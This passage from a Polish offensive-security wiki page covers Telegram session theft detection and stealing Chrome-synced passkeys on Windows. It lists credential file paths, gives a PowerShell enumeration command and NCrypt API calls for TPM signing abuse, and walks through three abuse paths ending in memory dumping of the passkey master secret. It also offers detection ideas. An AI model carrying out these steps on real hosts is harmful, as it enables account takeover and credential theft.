Implant uwzględniający ograniczoną przepustowość może najpierw przesłać tylko spis ścieżek plików, otrzymać identyfikator migawki oraz ścieżki już przechowywane przez C2, a następnie przesłać wyłącznie brakujące pliki. Dlatego niewielkie transfery przyrostowe po rekurencyjnym wyliczeniu `tdata` nadal mogą oznaczać udaną kradzież sesji.<sup>[[10]](#references)</sup>

### Wykrywanie i ograniczanie skutków

Skoreluj rekurencyjny dostęp do `tdata` przez proces inny niż Telegram z włączeniem `SeBackupPrivilege`, otwieraniem plików z semantyką tworzenia kopii zapasowych, aktywnością VSS lub uruchomieniem procesu potomnego `robocopy.exe` z opcją `/B`. Szukaj również szybkiego wyliczania zawartości zarówno `%APPDATA%`, jak i `%LOCALAPPDATA%\Packages`, po którym następują połączenia wychodzące z tego samego procesu. Po przejęciu konta użyj **Ustawienia → Urządzenia** (lub **Prywatność i bezpieczeństwo → Aktywne sesje**), aby zakończyć nierozpoznane sesje; samo włączenie weryfikacji dwuetapowej nie unieważnia wcześniej skradzionej autoryzacji.<sup>[[10]](#references)[[13]](#references)</sup>

## Kradzież poświadczeń Passkeys / WebAuthn z Chrome w systemie Windows

Jeśli uzyskano możliwość wykonywania kodu jako **użytkownik będący ofiarą** na hoście Windows korzystającym z **Chrome + passkeys synchronizowanymi przez Google Password Manager**, passkeys stają się interesującym celem post-exploitation nawet **bez uprawnień admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interesujące artefakty lokalne

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** przechowuje zakodowane w protobuf rekordy **`WebauthnCredentialSpecifics`**. Proces działający w kontekście tego samego użytkownika może wyliczyć **RP ID**, **nazwę użytkownika**, **ID poświadczenia** oraz zaszyfrowany materiał klucza prywatnego synchronizowanych passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** przechowuje lokalny stan rejestracji urządzenia, taki jak **`wrapped_identity_private_key`** oraz opakowany sekret używany do odzyskiwania synchronizowanych poświadczeń.<sup>[[4]](#references)</sup>

Szybka analiza:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Klucze powiązane z TPM nadal mogą być nadużywane jako lokalna wyrocznia podpisująca

Jeśli przeglądarka eksportuje klucz tożsamości obsługiwany przez TPM jako **`NCRYPT_OPAQUE_KEY_BLOB`** i zapisuje ten blob w stanie dostępnym dla użytkownika, malware **nie** musi wyodrębniać surowego klucza prywatnego. Może po prostu ponownie zaimportować blob na **tym samym komputerze** i poprosić lokalny TPM o podpisanie danych kontrolowanych przez atakującego:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

This oznacza, że **wiązanie ze sprzętem uniemożliwia eksport poza urządzenie, ale nie użycie przez tego samego użytkownika na przejętym punkcie końcowym**.

### Praktyczne ścieżki nadużyć

1. **Pass-ta-key / relay tożsamości urządzenia**<sup>[[4]](#references)</sup>
   - Wylicz `WebauthnCredentialSpecifics` z LevelDB przeglądarki Chrome.
   - Rozpocznij logowanie passkey i uzyskaj nowe wyzwanie WebAuthn.
   - Użyj skradzionego bloba `wrapped_identity_private_key` na TPM ofiary, aby podpisać żądanie powiązania cloud-authenticator.
   - Przekaż uzyskane assertion do relying party.
   - Jest to szczególnie cenne, gdy RP akceptuje `userVerification=preferred` lub nie odrzuca assertion z **`UV=0`**.
2. **Przejęcie oczekującego klucza UV**<sup>[[4]](#references)</sup>
   - Wymuś ponowne konfigurowanie, usuwając `passkey_enclave_state` lub wysyłając prawidłowo podpisaną operację `device/forget`.
   - Jeśli po konfiguracji urządzenie pozostanie w stanie **`uv_key_pending`**, zarejestruj kontrolowany przez atakującego publiczny klucz UV.
   - Jeśli dostawca nie weryfikuje atestacji / pochodzenia z bezpiecznego sprzętu dla nowego klucza UV, późniejsze podpisy utworzone kluczem atakującego będą traktowane jako **`UV=1`**.
3. **Kradzież sekretu głównego / odzyskiwanie SDS**<sup>[[4]](#references)</sup>
   - Wymuś odzyskiwanie lub ponowne dołączenie, aby Chrome pobrał główny sekret zsynchronizowanych passkeys.
   - Obserwuj odtworzenie/modyfikację `passkey_enclave_state`, a następnie zrzucaj pamięć Chrome, gdy tekst jawny **security domain secret (SDS)** znajduje się w pamięci.
   - Użyj odzyskanego SDS do odszyfrowania zaszyfrowanych pól w każdym rekordzie `WebauthnCredentialSpecifics` i odzyskania przenośnych kluczy prywatnych WebAuthn.

### Pomysły na DFIR / wykrywanie

- Monitoruj **usuwanie/ponowne tworzenie** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Generuj alerty o nietypowym dostępie procesów niebędących przeglądarką do Chrome **`Sync Data\LevelDB`**.
- Generuj alerty o **zrzutach pamięci Chrome** lub podejrzanym dostępie do pamięci między procesami.
- Badaj powtarzające się monity o **PIN odzyskiwania Google Password Manager** lub nieoczekiwane ponowne konfigurowanie.
- Pamiętaj, że WebAuthn **`signCount`** często nie jest przydatny w przypadku zsynchronizowanych passkeys, ponieważ może pozostać niezmienny, przez co klasyczne wykrywanie klonów jest mało skuteczne.

## References

- [1] [Unit 42 – Dochodzenie w sprawie wieloletnich, niewykrytych operacji wymierzonych w sektory o wysokiej wartości](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing z użyciem makra Word VBA przez SMTP → deszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci przekaźnikowej i mechanizmów działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nowa powierzchnia ataku w uwierzytelnianiu bezhasłowym](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / magazyn kluczy CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hakowanie Windows: ataki na systemy i sieci Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jak naprawdę działa magazyn danych Active Directory: wnętrze NTDS.dit (część 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – zdalny zrzut haseł z LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho rozszerza arsenał cybernetycznego szpiegostwa o toolkit Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcja CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – tryb kopii zapasowej Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [FAQ Telegrama – kończenie aktywnych sesji](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard i Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: ochrona i zarządzanie poświadczeniami](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz – obsługiwane dane wejściowe i szybki start](https://github.com/nikaiw/VMkatz)
- [18] [0xdf – HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
